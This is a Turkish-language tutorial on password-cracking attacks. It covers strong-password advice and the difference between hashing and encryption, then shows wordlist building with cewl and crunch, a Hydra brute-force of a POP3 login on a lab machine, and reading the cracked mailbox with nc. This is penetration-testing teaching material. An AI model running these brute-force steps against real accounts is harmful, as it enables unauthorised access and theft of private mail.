### Parola Kırma Saldırıları

#### Giriş ve Temel Kavramlar

##### Parola

Bilgi güvenliğinde __güvenlik zincirinin en zayıf halkası__ olabilecek yegane unsur __zayıf şifre ve parolalardır.__ Buna sebep olan da insandır! Sadece üşenildiğinden veya görmezden gelindiği için güvenlik açısından en sağlam kurumlar bile birkaç dakika içinde tuş olabilmektedir. En güçlü güvenlik araçlarının komutasını elinde bulunduran uzman kişiden evinde bilgisayardan internete bağlanan masum son kullanıcısına kadar en başta öğrenilecek konu __güvenli ve sağlam parola oluşturmadır.__

İki yıl öncesine kadar sayılar, semboller, büyük ve küçük harflerden oluşan __8 karakterli__ bir parolanın kırılması __2,25 yıl__ sürerken, bugün bu süre sadece __57 güne__ düştü. Şifre kırma tekniklerinin gelişmesi ve de bilgisayarların işlem kapasitelerinin gelişmesiyle beraber parolaların dayanma ömrü de kısalmaktadır. Bunu önlemenin tek yolu güvenli parolaların nasıl oluşturulacağından geçmektedir. Biz de sizin için bir __güvenli parola oluşturma__ rehberi derledik:

__Güçlü Parola Oluşturmanın 2 Temel Esası:__ _Uzunluk_ ve _Karmaşıklık_

İdeal bir parola/şifre uzundur ve içinde aynı anda __harfler, noktalama işaretleri, simgeler ve sayılar__ vardır. Güvenli bir şifre oluşturmak için dikkat edilecek en temel hususlar:

* Mümkün olduğunca en az __8 karakter__ kullanın.
* Her şey için __aynı parolayı kullanmayın.__ çünkü hackerlar, güvenliği zayıf olan sitelerdeki parolaları çaldıktan sonra aynı parola ve kullanıcı adını, bankacılık web siteleri gibi daha güvenli ortamlarda kullanmaya çalışırlar.
* __Parolalarınızı sık değiştirin.__ E-postanızdaki, online alışveriş, bankacılık sitelerindeki parolalarınızı yaklaşık her üç ayda bir değiştirmek için kendinize bir otomatik anımsatıcı ayarlayın.
* Parolanızdaki __karakter çeşitliliği ne kadar fazlaysa, o kadar iyidir__. Ancak parola çalan yazılımlar, “ve” yerine “&” veya “ki” yerine “2” gibi sık kullanılan harf-sembol dönüştürmelerini de otomatik olarak kontrol eder.
* Yalnızca en sık kullandığınız veya gördüğünüz harfleri ya da karakterleri değil, __klavyenizin tamamını kullanın.__
* Şifreler kesinlikle __klavye tuş sırasını takip eden karakterlerden oluşmamalı__. Mesela qwerty, asdqaz, 12345, 1234, 123456 gibi
* Şifrelerde adınızı, soyadınızı veya her ikisini birden kesinlikle kullanmayınız.
* Tuttuğunuz takımın, kedinizin, köpeğinizin ve bilumum favorilerinizin adını şifrelerinizde kullanmayın. Çünkü takım adları genelde Fenerbahçe, Galatasaray ve Beşiktaş olmakta, kedi ve köpek isimleri ise tekir, max, kurt, boncuk, şeker gibi kolay tahmin edilebilecek isimlerden oluşabilmektedir.
* __Harflerin__ yanı sıra, __rakam__ ve "?, @, !, #, %, +, -, *, %" gibi __özel karakterler__ kullanın.

[Kaynak](http://www.e-siber.com/guvenlik/guvenli-parola-olusturma-rehberi/)

##### Parola mı şifre mi?

Parola ve şifre sık sık birbiri yerine kullanılan ve karıştırılan iki farklı kavramdır.

__Parola:__ Sadece sizin tarafınızdan bilinen ve özel bilgilere erişim için kullanılan gizli karekterler dizgisidir

__Şifre:__ Herhangi bir bilginin çeşitli algoritmalar kullanılarak anahtarı bilmeyenler tarafından okunamaycak, çözülemeyecek hale getirilmiş halidir.

Parola ve şifre arasındaki temel farklar:

* Parolalar genellikle anlamlı, okunabilir karekterlerden oluşur
* şifreler genellikle ikili dosya türünde saklanır
* şifre sayısal, parola sözel anlam içerir

Dolayısıyla bizim sistemlere girerken kullandığımız anahtarlar parola olmaktadır. 

Bununla birlikte karıştırılan diğer bir konuda encoding, hash ve encryption kavramlarıdır.

__Encryption/şifreleme:__ Bir verinin sadece gizli anahtarı bilen yetkili kişilerce okunabilmesi amaçlı gerçekleştirilen format değişikliği olarak. şifrelemenin kodlamadan temel farkı sadece ilgili anahtarı bilen kişiler tarafından orjinaline döndürülebilmesidir. RSA, AES en sık kullanılan şifreleme algoritmalarındandır.

__Hash:__ Hash fonksiyonları doğrulama amaçlı kullanılır ve matematiksel olarak geri döndürülemez özelliğe sahiptirler. Genellikle bir verinin içeriğinin değişmediğinin garantisi olarak kullanılır veya bir parolanın veritabanında açık bir şekilde tutulmasını engellemek ve başkaları tarafından (işin sahibi dahil) bilinmesi istenmediği zaman tercih edilir.
MD5, SHA1 en fazla bilinen hash tipine örnektir. Hash, Encoding(kodlama) ve Encryption(şifreleme) kavramları genellikle birbirleri yerine kullanılsa da üç kavramda özünde farklıdır.

__Encoding/Kodlama:__ Verinin farklı sistem ve ortamlarda dolaşabilmesi için bir formattan başka bir formata dönüştürülmesi işlemidir. Kodlama gizlilik sağlamak için kullanılmaz.

#### Çevrimiçi Parola Atakları

Güvenlik açıklarında kullandığımız otomatik taramalarına benzer taktikle parola öğrenme için bulunan scriptler de mevcuttur. Biz bunun için sunucudan başarılı giriş mesajını alana kadar otomatik çevrimiçi parola tarayıcılarını veya parola XXX guess kullanıyoruz. Teknik olarak bu metodlar __brute force__ olarak adlandırılmaktadır. Bu metodu kullanan araçlar kullanıcı adı ve parola XXX combination olasalığını verdiğimiz vakit süresince denemektedir.

Brute force metodu ile parola kırılması parolanın zorluğuna göre saatlerce hat da aylar, yıllar sürebilmektedir. Çoğunlukla biz sıfırdan her olasılığı deneme yerine, parolanın içerebileceği kelimeleri bu araçlara belirleyebiliriz. Mesela, bir _xxx kafenin_ internet sitesinin yönetici parolasını öğrenmek istiyorsanız, _kafenin adı_, _kafe_, _yöneticisi_, _adresi_, _çeşitli tarihler_ vs bilgilerin girilmesi brute force metodu ile daha iyi sonuçlar alınabilmektedir.

##### Sözcük Listesi

Bir atağı gerçekleştirmeden önce, yapılacak en önemli adımın o konu hakkında bilgi toplamak olduğu önceden belirtmiştik. Bir kullanıcın şifresini kırmak istiyorsak o kullanıcı hakkında ne kadar bilgi varsa; veya tüm bir sistemin kullanıcılarının parolalarını öğrenmek istiyorsak, o sistem hakkında bilgi bizim işimize çok yarıyacaktır. Bir text dosyası oluşturyoruz ve o topladığımız bilgileri tek tek giriyoruz:

```ShellSession
root@kali:~# cat userlist.txt 
georgia
john
mom
james
```

##### Parola Listesi

Kullanıcı bilgilerinin yanı sıra, olabilecek parola bilgileri hakkında da bir dosya oluşturuyoruz.

```ShellSession
root@kali:~# cat passwordfile.txt password
Password
password1
Password1
Password123
password123
```

 Biz şimdi genel mantığı anlatma amaçlı böyle basit bir bilgiler giriyoruz, ama gerçekte biraz ciddi ciddi araştırma yapılması gerekir. İnternette de bu türlü listeler bulunabilir: 
    * http://packetstormsecurity.com/Crackers/wordlists/
    * http://www.openwall.com/wordlists/

Hatda Kali'nin kendisinde de `/usr/share/wordlists` dizininde `rockyou.txt.gz` adlı dosyada parola sözlüğü bulunmaktadır. _gz_ arşiv dosyasıdır, açıldığında 140 MB lık bir parola sözlüğü başlangıç için çok işimize gelecektir. Ama tabii unutulmamalıdır ki, daha iyi sonuçlar için hedefimizdeki kişinin bilgileri daha çok iyi sonuçlar almamıza vesile olacaktır.

Herşeyin otomatikleştirilmiş hali var da, bu parola sözlük olayının yokmu? diyebilirsiniz; O da var. __ceWL__ gibi araçlar belirlediğimiz bir siteye giderek orda bulunan bilgileri araştırır ve işimizi yarayabilecek bir sözlük oluşturur. Aşağıda _www.bulbsecurity.com_ için sözlük oluşturma örneği verilmiştir:

```ShellSession
root@kali:~# cewl --help
cewl 5.0 Robin Wood (robin@digininja.org) (www.digininja.org)

Usage: cewl [OPTION] ... URL
--snip--
--depth x, -d x: depth to spider to, default 2
--min_word_length, -m: minimum word length, default 3
--offsite, -o: let the spider visit other sites
--write, -w file: write the output to the file
--ua, -u user-agent: useragent to send
--snip--
URL: The site to spider.
root@kali:~# cewl -w bulbwords.txt -d 1 -m 5 www.bulbsecurity.com
```

Diğer bir araç ise __Crunch__. Bu araç kendisine girilen karakterlerin çeşitli çeşitli olasılığını oluşturmamızı sağlar. Çok basit bir kullanımı aşağıda verilmiştir. A ve B karakterleri ile oluşturulabilecek tüm 7 karakterli sözcükleri sıralar. Mesela bazı sitelerdeki gibi en az 6 karakter, en fazla 10 karakter gibisinden sınırlama belirlenmiş durumlarda işimize gelebilir.

```ShellSession
root@kali:~# crunch 7 7 AB
Crunch will now generate the following amount of data: 1024 bytes 0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 128 
AAAAAAA
AAAAAAB
--snip--
```

##### Hydra ile Kullanıcı Adı ve Parola Öğrenme

Hedefimizdeki sistemde olabilecek kullanıcı adı ve parola listelerini oluşturduktan sonra, __Hydra__ ile artık onları öğrenmeye çalışabiliriz.

```ShellSession
root@kali:~# hydra -L userlist.txt -P passwordfile.txt 192.168.20.10 pop3
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2015-01-12 15:29:26
[DATA] 16 tasks, 1 server, 24 login tries (l:4/p:6), ~1 try per task
[DATA] attacking service pop3 on port 110
[110][pop3] host: 192.168.20.10 login: georgia password: password
[STATUS] attack finished for 192.168.20.10 (waiting for children to finish) 
1 of 1 target successfuly completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-01-12 15:29:48
```

Örneğimizde hydra aracına `-L` ile kullanıcı listesini `-P` ile parola listesini giriyoruz, ve önceden kurduğumuz Windows XP makinemizdeki POP3 için olabilecek giriş bilgilerini denemiş oluyoruz. Sonuç olarak, hydra _login: georgia, password: password_ olarak bulmuş oldu.

Bazı durumlarda, hedefimizdeki kullanıcın ismini bileceğimizden sadece parola listesini girmemiz yeterli olacaktır. Bunun için `-L` yerine `-l` ile o kullanıcın ismini giriyoruz. 

```ShellSession

root@kali:~# hydra -l georgia -P passwordfile.txt 192.168.20.10 pop3
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only 
[DATA] 16 tasks, 1 server, 24 login tries (l:4/p:6), ~1 try per task
[DATA] attacking service pop3 on port 110
[110][pop3] host: 192.168.20.10 login: georgia password: password
[STATUS] attack finished for 192.168.20.10 (waiting for children to finish)
1 of 1 target successfuly completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2015-01-07 20:22:23
```

Şimdi aldığımız sonuçları kullanarak, _georgia_ adlı kullanıcın mesajlarını okuyalım. POP3 protokolünü belirliyoruz, sonra kullanıcı adını ve parolası istendiğinde giriyoruz. 

```ShellSession
root@kali:~# nc 192.168.20.10 pop3
+OK POP3 server xpvictim.com ready <00037.23305859@xpvictim.com>
USER georgia
+OK georgia welcome here
PASS password
+OK mailbox for georgia has 0 messages (0 octets)
```

Unutmamız gereken şey, bazı sistemler, mesela _google mail_ belli bir hatalı giriş denemesinden sonra o hesabı askıya alır. Bazen deneme yaptığın IP adresi kara listeye atar. Bunu sisteme göre deneme aralıklarını ayarlanabilse de, genel sonuç olarak biraz uzun sürebilmektedir. Bunu aşmanın yolu ise bir sonraki bölümde öğreneceğimiz gerçek giriş denemesini yapmadan, şifreyi öğrenmeye çalışmaktır.

##### Çevrimdışı Saldırılar

Bu saldırıda kullanıcı adları ve parolaların sistemde kayıtlı tutulduğu noktalara erişim sağlanmaya çalışılır. Kullanıcı adları ve parolalar text olarak tutulmuş veya şifrelenmiş(encrypted) ve özetlenmiş(hashing) şekilde tutuluyor olabilir.

Yetkilendirme yapılırken parolanın özet değeri alınarak kullanıcının girdiği ve sistemde daha önce kaydedilen parolanın özeti karşılaştırılır . Buna göre kullanıcıya yetki verilir. Özet işlemi için MD5, SHA, NTLM gibi metotlar vardır.
Bu saldırı türünde de brute-force, dictionary ve rainbow tabloları olmak üzere 3 farklı metot söylenebilir.







http://www.slideshare.net/bgasecurity/szma-testlerinde-parola-krma-saldrlar